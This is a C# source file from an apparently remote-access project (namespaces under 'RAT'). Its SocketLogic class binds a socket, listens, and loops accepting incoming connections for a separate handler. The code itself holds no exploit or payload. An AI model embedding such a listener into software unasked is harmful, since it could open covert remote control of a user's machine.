using RAT.src.Configurations;
using RAT.src.Models;
using RAT.src.Sockets;
using System.Net;
using System.Net.Sockets;

namespace RAT.src.SocketLogic
{
    /// <summary>
    /// Class contains logic for socket initial setup before socket messaging system start.
    /// </summary>
    public class SocketLogic
    {
        // Not using DI for logic clases, not to cause extra memory usage + library bindings.
        private SocketConnectionLogic _socketConnectionLogic { get; } = new SocketConnectionLogic();

        /// <summary>
        /// Configures socket, starts listening, and when client connection, then delegates process to connection logic.
        /// </summary>
        public void StartListening()
        {
            // Get socket configuration with local endpoint binding.
            var configurator = new SocketConfigurator();
            Socket socket = configurator.GetConfiguredSocket();
            IPEndPoint localEndPoint = configurator.GetLocalEndpointConfigurationForSocket();
            socket.Bind(localEndPoint);

            // Start listen.
            socket.Listen(100);

            // Waiting for someone to knock.
            while (true)
            {
                // Block thread until someone knocks.
                ManualResetEventWrapper.ResetEvent.Reset();
                socket.BeginAccept(_socketConnectionLogic.OnAccept, socket);
                ManualResetEventWrapper.ResetEvent.WaitOne();
            }
        }
    }
}